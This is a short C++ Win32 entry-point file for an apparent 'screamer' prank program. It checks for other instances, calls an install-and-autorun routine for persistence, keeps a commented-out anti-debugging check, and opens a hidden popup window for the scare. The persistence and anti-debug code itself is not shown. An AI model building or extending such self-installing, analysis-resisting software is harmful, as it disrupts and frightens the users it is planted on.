#include <Windows.h>

#include "checkAnother.h"
#include "installAndAutorun.h"
#include "registerClasses.h"
#include "class_names.h"
#include "top_window_name.h"
int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ PWSTR pCmdLine, _In_ int nCmdShow) {
	//if (!(IsDebuggerPresent()) && checkAnother() && installAndAutorun() && registerClasses(hInstance) && SUCCEEDED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE))) {
	if (checkAnother() && installAndAutorun() && registerClasses(hInstance) && SUCCEEDED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE))) {
		// Не даём себя отлаживать, проверяем другие экземпляры, устанавливаемся и регистрируем классы
		HWND screamer_window;
		screamer_window = CreateWindowExW(WS_EX_OVERLAPPEDWINDOW | WS_EX_TOOLWINDOW, SCREAMER_CLASS_NAME, L"", WS_POPUP | WS_BORDER | WS_DISABLED, CW_USEDEFAULT, CW_USEDEFAULT, 100, 100, NULL, NULL, hInstance, NULL);
		if (screamer_window) {
			HWND top_window;
			top_window = CreateWindowExW(0, TOP_CLASS_NAME, top_window_name, 0, CW_USEDEFAULT, CW_USEDEFAULT, 100, 100, NULL, NULL, hInstance, (LPVOID)screamer_window);
			if (top_window) {
				MSG message;
				while (GetMessageW(&message, NULL, 0, 0) > 0) {
					TranslateMessage(&message);
					DispatchMessageW(&message);
				};
			};
		};
		CoUninitialize();
	};
	return 0;
};